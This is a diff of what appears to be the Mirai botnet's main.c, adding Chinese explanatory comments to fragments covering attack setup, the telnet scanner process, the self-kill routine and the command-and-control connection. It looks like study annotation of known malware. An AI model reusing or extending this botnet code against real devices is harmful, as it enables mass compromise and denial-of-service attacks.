@@ -153,14 +153,15 @@ int main(int argc, char **args)
     close(STDERR);
 #endif
 
-    attack_init();
+    attack_init();/*添加攻击类型和对应的函数指针*/
     killer_init();
 #ifndef DEBUG
 #ifdef MIRAI_TELNET
-    scanner_init();
+    scanner_init();//扫描子进程
 #endif
 #endif
 
+    //父进程， 即main函数的主循环去监控bot和cnc之间的connection，而子进程在scanner_init中扫描并上报（上报也是一个子进程）
     while (TRUE)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
@@ -220,7 +221,7 @@ int main(int argc, char **args)
             printf("[main] Detected newer instance running! Killing self\n");
 #endif
 #ifdef MIRAI_TELNET
-            scanner_kill();
+            scanner_kill();//kill掉自己
 #endif
             killer_kill();
             attack_kill_all();
@@ -408,6 +409,8 @@ static void establish_connection(void)
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
+
+//关闭与CNC的连接
 static void teardown_connection(void)
 {
 #ifdef DEBUG
